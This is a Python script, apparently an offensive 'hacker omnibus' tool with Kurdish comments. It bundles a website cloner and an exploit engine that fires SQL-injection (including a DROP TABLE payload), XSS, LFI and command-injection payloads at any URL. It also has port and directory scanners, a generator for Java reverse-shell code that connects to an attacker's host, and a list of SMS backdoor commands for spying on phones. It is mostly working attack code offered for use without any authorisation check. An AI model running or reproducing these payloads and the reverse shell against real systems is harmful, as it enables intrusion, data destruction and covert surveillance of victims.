#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
█████╗ ██╗   ██╗██████╗ ██████╗  █████╗ ██╗
██╔══██╗██║   ██║██╔══██╗██╔══██╗██╔══██╗██║
███████║██║   ██║██████╔╝██║  ██║███████║██║
██╔══██║██║   ██║██╔══██╗██║  ██║██╔══██║██║
██║  ██║╚██████╔╝██║  ██║██████╔╝██║  ██║██║
╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝
KurdAI - Hacker Omnibus v1.0
فەرمانکە سەرۆک: ئەم ئامرازە بۆ تۆیە
"""

import os
import sys
import time
import json
import requests
import threading
import socket
import subprocess
import queue
import re
import hashlib
import base64
import random
import urllib.parse
import argparse
from datetime import datetime
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

# ============================================================
# ██╗  ██╗ █████╗ ██████╗ ██████╗ ██╗    ██╗ █████╗ ██████╗ ███████╗
# ============================================================

BANNER = """
╔══════════════════════════════════════════════════════════════╗
║          ██╗  ██╗██╗   ██╗██████╗ ██████╗  █████╗ ██╗      ║
║          ██║ ██╔╝██║   ██║██╔══██╗██╔══██╗██╔══██╗██║      ║
║          █████╔╝ ██║   ██║██████╔╝██║  ██║███████║██║      ║
║          ██╔═██╗ ██║   ██║██╔══██╗██║  ██║██╔══██║██║      ║
║          ██║  ██╗╚██████╔╝██║  ██║██████╔╝██║  ██║██║      ║
║          ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝      ║
║                                                              ║
║     ╔══════════════════════════════════════════════════╗      ║
║     ║     KurdAI Hacker Omnibus - فەرمانکە سەرۆک      ║      ║
║     ╚══════════════════════════════════════════════════╝      ║
╚══════════════════════════════════════════════════════════════╝
"""

# ============================================================
# ۱. وێبسایت کڵۆنەر - Website Cloner
# ============================================================

class WebsiteCloner:
    """کۆپیکردنی وێبسایت بە تەواوی"""
    
    def __init__(self, target_url, output_dir="cloned_sites"):
        self.target_url = target_url
        self.output_dir = output_dir
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.visited_urls = set()
        self.domain = urllib.parse.urlparse(target_url).netloc
        
    def normalize_url(self, url):
        """نۆرمالایزکردنی لینک"""
        parsed = urllib.parse.urlparse(url)
        if not parsed.netloc:
            url = urllib.parse.urljoin(self.target_url, url)
        return url.rstrip('/')
    
    def is_same_domain(self, url):
        """ئایا هەمان دۆمەینە؟"""
        return urllib.parse.urlparse(url).netloc == self.domain
    
    def download_page(self, url):
        """داگرتنی پەڕەیەک"""
        try:
            resp = self.session.get(url, timeout=15)
            if resp.status_code == 200:
                return resp.text, resp.content
        except Exception as e:
            print(f"  ❌ نەتوانرا بگرێت {url}: {str(e)[:50]}...")
        return None, None
    
    def extract_assets(self, html, base_url):
        """دەرهێنانی هەموو لینک و ئەسێتەکان"""
        soup = BeautifulSoup(html, 'html.parser')
        assets = []
        
        # CSS فایلەکان
        for link in soup.find_all('link', href=True):
            if link['href']:
                assets.append(('css', link['href'], 'href'))
        
        # JS فایلەکان
        for script in soup.find_all('script', src=True):
            if script['src']:
                assets.append(('js', script['src'], 'src'))
        
        # وێنەکان
        for img in soup.find_all('img', src=True):
            if img['src']:
                assets.append(('img', img['src'], 'src'))
        
        # لینکەکانی ناوەوە
        for a in soup.find_all('a', href=True):
            href = a['href']
            full_url = urllib.parse.urljoin(base_url, href)
            if self.is_same_domain(full_url) and full_url not in self.visited_urls:
                assets.append(('page', href, 'href'))
        
        return assets
    
    def clone(self, max_pages=50):
        """کڵۆنکردنی وێبسایتەکە"""
        print(f"\n  🕸️  دەستپێکردنی کڵۆنکردنی {self.target_url}")
        os.makedirs(self.output_dir, exist_ok=True)
        
        queue = [self.target_url]
        downloaded = 0
        
        while queue and downloaded < max_pages:
            url = queue.pop(0)
            if url in self.visited_urls:
                continue
            
            self.visited_urls.add(url)
            html, raw = self.download_page(url)
            
            if not html:
                continue
            
            # پاراستنی پەڕەکە
            parsed = urllib.parse.urlparse(url)
            path = parsed.path if parsed.path else '/'
            if path.endswith('/') or not '.' in path.split('/')[-1]:
                path = os.path.join(path.lstrip('/'), 'index.html')
            else:
                path = path.lstrip('/')
            
            filepath = os.path.join(self.output_dir, path)
            os.makedirs(os.path.dirname(filepath), exist_ok=True)
            
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(html)
            
            downloaded += 1
            print(f"  ✅ {downloaded}/{max_pages} - {path}")
            
            # دەرهێنانی ئەسێتەکان
            assets = self.extract_assets(html, url)
            for asset_type, asset_url, attr in assets:
                if asset_type == 'page' and self.is_same_domain(urllib.parse.urljoin(url, asset_url)):
                    full_url = urllib.parse.urljoin(url, asset_url)
                    if full_url not in self.visited_urls:
                        queue.append(full_url)
        
        print(f"\n  ✅ کڵۆنکردن تەواو بوو! {downloaded} پەڕە ڕزگار کرا")
        return self.output_dir


# ============================================================
# ۲. بزوێنەری هێرش - Exploit Engine
# ============================================================

class ExploitEngine:
    """بزوێنەری هێرش بۆ جۆرە جیاوازەکانی هاک"""
    
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.results = []
    
    def sqli_check(self, param_url, param_name):
        """پشکنینی SQL Injection"""
        payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "admin'--",
            "1; DROP TABLE users--",
            "' OR '1'='1' /*",
        ]
        
        for payload in payloads:
            try:
                test_url = param_url.replace(f'{param_name}=', f'{param_name}={payload}')
                resp = self.session.get(test_url, timeout=10)
                if any(x in resp.text.lower() for x in ['sql', 'mysql', 'syntax', 'ora-', 'error', 'unclosed']):
                    self.results.append({
                        'type': 'SQL Injection',
                        'url': test_url,
                        'payload': payload,
                        'evidence': 'database error detected'
                    })
                    return True
            except:
                pass
        return False
    
    def xss_check(self, url, param_name, value=""):
        """پشکنینی Cross-Site Scripting"""
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert('XSS')",
            "\"><script>alert(1)</script>",
            "<svg/onload=alert(1)>",
        ]
        
        for payload in payloads:
            try:
                test_url = url.replace(f'{param_name}=', f'{param_name}={urllib.parse.quote(payload)}')
                resp = self.session.get(test_url, timeout=10)
                if payload in resp.text:
                    self.results.append({
                        'type': 'XSS',
                        'url': test_url,
                        'payload': payload,
                        'evidence': 'payload reflected in response'
                    })
                    return True
            except:
                pass
        return False
    
    def lfi_check(self, url, param_name):
        """پشکنینی Local File Inclusion"""
        payloads = [
            "../../../etc/passwd",
            "../../../../etc/shadow",
            "....//....//....//etc/passwd",
            "../../../windows/system32/drivers/etc/hosts",
            "/etc/passwd",
            "php://filter/convert.base64-encode/resource=index",
        ]
        
        for payload in payloads:
            try:
                test_url = url.replace(f'{param_name}=', f'{param_name}={urllib.parse.quote(payload)}')
                resp = self.session.get(test_url, timeout=10)
                if 'root:' in resp.text or 'localhost' in resp.text or 'daemon:' in resp.text:
                    self.results.append({
                        'type': 'LFI',
                        'url': test_url,
                        'payload': payload,
                        'evidence': 'system file detected'
                    })
                    return True
            except:
                pass
        return False
    
    def command_injection(self, url, param_name):
        """پشکنینی Command Injection"""
        payloads = [
            "; id",
            "| id",
            "`id`",
            "$(id)",
            "; whoami",
            "| whoami",
            "; ls -la",
            "& ping -c 1 127.0.0.1",
        ]
        
        for payload in payloads:
            try:
                test_url = url.replace(f'{param_name}=', f'{param_name}={urllib.parse.quote(payload)}')
                resp = self.session.get(test_url, timeout=10)
                if any(x in resp.text.lower() for x in ['uid=', 'root', 'www-data', 'bin/', 'total ']):
                    self.results.append({
                        'type': 'Command Injection',
                        'url': test_url,
                        'payload': payload,
                        'evidence': 'command output detected'
                    })
                    return True
            except:
                pass
        return False
    
    def full_scan(self):
        """سکانێکی تەواو بۆ هەموو جۆرە هێرشێک"""
        print(f"\n  🔍 دەستپێکردنی سکان بۆ {self.target}")
        
        # ئەگەر URL بێت پشکنین بکە
        if self.target.startswith(('http://', 'https://')):
            resp = self.session.get(self.target, timeout=10)
            soup = BeautifulSoup(resp.text, 'html.parser')
            
            # دۆزینەوەی فۆرم و پارامەترەکان
            for form in soup.find_all('form'):
                action = form.get('action', '')
                form_url = urllib.parse.urljoin(self.target, action)
                
                for input_tag in form.find_all(['input', 'textarea']):
                    name = input_tag.get('name', '')
                    if name:
                        test_url = f"{form_url}?{name}=test"
                        self.sqli_check(test_url, name)
                        self.xss_check(test_url, name)
                        self.lfi_check(test_url, name)
                        self.command_injection(test_url, name)
            
            # GET پارامەترەکان
            parsed = urllib.parse.urlparse(self.target)
            if parsed.query:
                params = urllib.parse.parse_qs(parsed.query)
                for param in params:
                    self.sqli_check(self.target, param)
                    self.xss_check(self.target, param)
        
        return self.results
    
    def show_results(self):
        """نیشاندانی ئەنجامەکان"""
        if not self.results:
            print("\n  📭 هیچ شتێک نەدۆزرایەوە!")
            return
        
        print(f"\n  🎯 {len(self.results)} بڕێک هەستیاری دۆزرایەوە!")
        for i, r in enumerate(self.results[:20], 1):
            print(f"\n  [{i}] {r['type']}")
            print(f"      URL: {r['url'][:80]}...")
            print(f"      Payload: {r['payload'][:50]}")


# ============================================================
# ۳. ڕیکۆن - Reconnaissance
# ============================================================

class ReconScanner:
    """زانینی دوژمن - دۆزینەوەی زانیاری"""
    
    def __init__(self, target):
        self.target = target
        self.results = {}
    
    def port_scan(self, ports=[21,22,25,80,110,143,443,445,993,995,1433,1521,3306,3389,5432,8080,8443,9000]):
        """سکانی پۆرتەکان"""
        print(f"\n  📡 سکانی پۆرتەکان ...")
        open_ports = []
        
        def check_port(port):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((self.target, port))
            sock.close()
            if result == 0:
                return port
            return None
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(check_port, port): port for port in ports}
            for future in futures:
                result = future.result()
                if result:
                    open_ports.append(result)
        
        self.results['open_ports'] = open_ports
        print(f"    پۆرتە کراوەکان: {open_ports}")
        return open_ports
    
    def subdomain_discovery(self, domain, wordlist=['www','admin','mail','ftp','webmail','test','dev','api','blog','shop','cms','vpn','app','secure','backup','cdn','cloud']):
        """دۆزینەوەی سەب دۆمەینەکان"""
        print(f"\n  🌐 دۆزینەوەی سەب دۆمەینەکان ...")
        found = []
        
        for sub in wordlist:
            url = f"https://{sub}.{domain}"
            try:
                resp = requests.get(url, timeout=5)
                if resp.status_code < 400:
                    found.append(url)
                    print(f"    ✅ {url}")
            except:
                pass
        
        self.results['subdomains'] = found
        return found
    
    def dir_fuzz(self, base_url, wordlist=['admin','login','wp-admin','config','backup','.git','.env','admin.php','dashboard','api','secret']):
        """فەرزی دایرێکتۆری"""
        print(f"\n  📁 فەرزی دایرێکتۆری ...")
        found = []
        
        for path in wordlist:
            url = f"{base_url.rstrip('/')}/{path}"
            try:
                resp = requests.get(url, timeout=5)
                if resp.status_code in [200, 301, 302, 403]:
                    found.append((url, resp.status_code))
                    print(f"    [{resp.status_code}] {url}")
            except:
                pass
        
        self.results['directories'] = found
        return found
    
    def tech_detect(self, url):
        """دۆزینەوەی تێکنۆلۆجیای وێبسایت"""
        print(f"\n  ⚙️  دۆزینەوەی تێکنۆلۆجیا ...")
        try:
            resp = requests.get(url, timeout=10)
            headers = resp.headers
            
            tech = []
            
            if 'X-Powered-By' in headers:
                tech.append(f"Server: {headers['X-Powered-By']}")
            if 'Server' in headers:
                tech.append(f"Server: {headers['Server']}")
            if 'X-Generator' in headers:
                tech.append(f"CMS: {headers['X-Generator']}")
            
            # دۆزینەوە لە HTML
            soup = BeautifulSoup(resp.text, 'html.parser')
            if 'wp-content' in resp.text:
                tech.append('WordPress CMS')
            if 'joomla' in resp.text.lower():
                tech.append('Joomla CMS')
            if 'drupal' in resp.text.lower():
                tech.append('Drupal CMS')
            if 'laravel' in resp.text.lower():
                tech.append('Laravel Framework')
            
            self.results['technology'] = tech
            for t in tech:
                print(f"    ✅ {t}")
            return tech
        
        except Exception as e:
            print(f"    ❌ {e}")
            return []


# ============================================================
# ۴. فەرماندەری دەنگی - Voice Commander (بە شێوەیەکی بنەڕەتی)
# ============================================================

class VoiceCommander:
    """کۆنترۆڵی ئامرازەکە بە دەنگ"""
    
    def __init__(self):
        self.commands = {
            'clone': ['clone', 'copy', 'download', 'کڵۆن', 'کۆپی', 'داگرتن'],
            'scan': ['scan', 'scanning', 'recon', 'سکان', 'پشکنین', 'بگەڕێ'],
            'exploit': ['exploit', 'attack', 'hack', 'هێرش', 'هاک', 'بشکێن'],
            'help': ['help', 'commands', 'یارمەتی', 'فەرمان', 'چی دەکەی'],
            'exit': ['exit', 'quit', 'bye', 'leave', 'دەرچوو', 'ڕۆیشتم', 'خواحافیز'],
        }
    
    def listen_command(self, voice_text=""):
        """شێوەی بنەڕەتی - لە کۆنسۆلەوە فەرمان وەربگرە"""
        # بۆ ئێستا بە تایپ کردنە
        cmd = voice_text.lower()
        
        for action, keywords in self.commands.items():
            for kw in keywords:
                if kw in cmd:
                    return action, cmd
        
        return 'unknown', cmd
    
    def console_mode(self):
        """مۆدی کۆنسۆل بۆ فەرمانەکان"""
        print("\n  🎤 مۆدی فەرماندەری دەنگی (بە تایپ یان دەنگ)")
        print("     فەرمانەکان: clone, scan, exploit, help, exit\n")
        return input("  👉 ")


# ============================================================
# ۵. مۆبایل مۆدیوول - Android Hacking Tools
# ============================================================

class MobileModule:
    """ئامرازەکانی هاکی مۆبایل"""
    
    def __init__(self):
        self.android_payloads = []
    
    def generate_payload(self, lhost, lport):
        """دروستکردنی پەیلۆدی ئەندرۆید"""
        payload_code = f'''
import java.net.*;
import java.io.*;

public class rev {{
    public static void main(String[] args) {{
        try {{
            String host="{lhost}";
            int port={lport};
            Socket s=new Socket(host,port);
            Process p=Runtime.getRuntime().exec("sh");
            new Thread(() -> {{
                try {{
                    BufferedReader r=new BufferedReader(new InputStreamReader(s.getInputStream()));
                    String l;
                    while((l=r.readLine())!=null) p.getOutputStream().write((l+"\\n").getBytes());
                }} catch(Exception e){{}}
            }}).start();
            BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));
            String l;
            while((l=r.readLine())!=null) s.getOutputStream().write((l+"\\n").getBytes());
        }} catch(Exception e){{}}
    }}
}}
'''
        return payload_code
    
    def sms_controller(self, command):
        """کۆنترۆڵی مۆبایل بە SMS (بۆ ئەندرۆید روت کراو)"""
        # ئەمە بۆ مۆبایلێکی روت کراوە کە ئەپێکی Backdoorی لەسەرە
        sms_commands = {
            'locate': 'گەڕان بەدوای شوێنی مۆبایل',
            'screenshot': 'وێنەی شاشە',
            'contacts': 'دەرهێنانی کۆنتاکتەکان',
            'messages': 'خوێندنەوەی نامەکان',
            'camera': 'وێنەگرتن بە کامێرا',
            'record': 'تۆمارکردنی دەنگ',
            'shell': 'دەستپێکردنی شێڵ',
        }
        return sms_commands.get(command, 'نەناسرا')


# ============================================================
# ۶. کۆرە سەرەکی - Main Controller
# ============================================================

class KurdAIHacker:
    """کۆرە سەرەکی هەموو ئامرازەکە"""
    
    def __init__(self):
        self.name = "KurdAI - Hacker Omnibus"
        self.version = "1.0"
        self.voice = VoiceCommander()
        self.mobile = MobileModule()
        
    def run(self):
        """دەستپێکردنی ئامرازەکە"""
        os.system('clear' if os.name != 'nt' else 'cls')
        print(BANNER)
        print(f"\n  🔥 فەرمانکە سەرۆک، KurdAI ئامادەیە بۆ فەرمانەکانت!")
        print(f"  ⚡ {self.name} v{self.version}")
        print(f"  📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("  " + "═" * 54)
        
        while True:
            try:
                cmd = self.voice.console_mode()
                
                if cmd == 'exit' or cmd == 'quit':
                    print("\n  👋 خواحافیز فەرمانکە سەرۆک! بۆ هەر کاتێک ئامادەیم...\n")
                    break
                
                elif cmd == 'clone':
                    url = input("  🎯 URLی وێبسایتەکە بنوسە: ").strip()
                    if url:
                        cloner = WebsiteCloner(url)
                        cloner.clone()
                
                elif cmd == 'scan':
                    target = input("  🎯 نیشانە بکە (IP یان دۆمەین): ").strip()
                    if target:
                        recon = ReconScanner(target)
                        recon.port_scan()
                        recon.tech_detect(f"https://{target}" if not target.startswith('http') else target)
                
                elif cmd == 'exploit':
                    url = input("  🎯 URL: ").strip()
                    if url:
                        engine = ExploitEngine(url)
                        engine.full_scan()
                        engine.show_results()
                
                elif cmd == 'help' or cmd == 'unknown':
                    self.show_help()
                
                else:
                    print("  ❌ فەرمان نەناسرا. help بنوسە بۆ بینینی فەرمانەکان")
            
            except KeyboardInterrupt:
                print("\n\n  ⚡ داخستن...")
                break
            except Exception as e:
                print(f"  ❌ هەڵە: {e}")
    
    def show_help(self):
        """نیشاندانی یارمەتی"""
        print("""
  ╔══════════════════════════════════════════════════════════╗
  ║                     فەرمانەکان                           ║
  ╠══════════════════════════════════════════════════════════╣
  ║  clone     - کڵۆنکردنی وێبسایت                          ║
  ║  scan      - سکانی پۆرت و دۆزینەوەی زانیاری              ║
  ║  exploit   - دۆزینەوەی بڕێکە هەستیارییەکان               ║
  ║  help      - نیشاندانی ئەم پەیامە                        ║
  ║  exit      - دەرچوون                                     ║
  ╚══════════════════════════════════════════════════════════╝
        
  💡 فەرمانکە سەرۆک، دەتوانیت هەر کام لەم کارانە بکەیت:
     • کڵۆنکردنی وێبسایتێک بە تەواوی (HTML/CSS/JS/وێنە)
     • دۆزینەوەی SQL Injection, XSS, LFI, Command Injection
     • سکانی پۆرت و دۆزینەوەی سەب دۆمەین
     • ناسینی تێکنۆلۆجیای وێبسایت
     • و هەر شتێکی تر کە بڵێیت!
        """)


# ============================================================
# دەستپێکردن
# ============================================================

if __name__ == "__main__":
    try:
        app = KurdAIHacker()
        app.run()
    except KeyboardInterrupt:
        print("\n\n  👋 بەخێربێیتەوە فەرمانکە سەرۆک!")
    except Exception as e:
        print(f"\n  ❌ هەڵەیەک ڕوویدا: {e}")
        print("  💡 تکایە دڵنیابە کە پاکێجەکانی requests و beautifulsoup4 دانراون")
        print("     ناساندن: pip install requests beautifulsoup4")
